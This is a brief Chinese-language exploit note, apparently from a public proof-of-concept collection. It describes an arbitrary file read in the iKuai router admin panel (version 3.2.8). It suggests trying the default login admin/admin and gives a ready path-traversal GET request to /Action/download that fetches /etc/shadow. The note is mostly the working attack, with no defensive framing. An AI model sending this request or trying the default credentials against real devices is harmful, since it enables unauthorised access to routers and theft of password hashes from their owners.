# 爱快(iKuai) 后台任意文件读取(0day)

影响版本，不一定是绝对版本，也可能其它版本都存在：3.2.8 x64 Build201910101758

默认密码可以试试：admin/admin

**PoC：**

```
GET /Action/download?filename=../../../../../../etc/shadow HTTP/1.1
Host：
....
```

ref：

https://forum.ywhack.com/thread-115307-1-8.html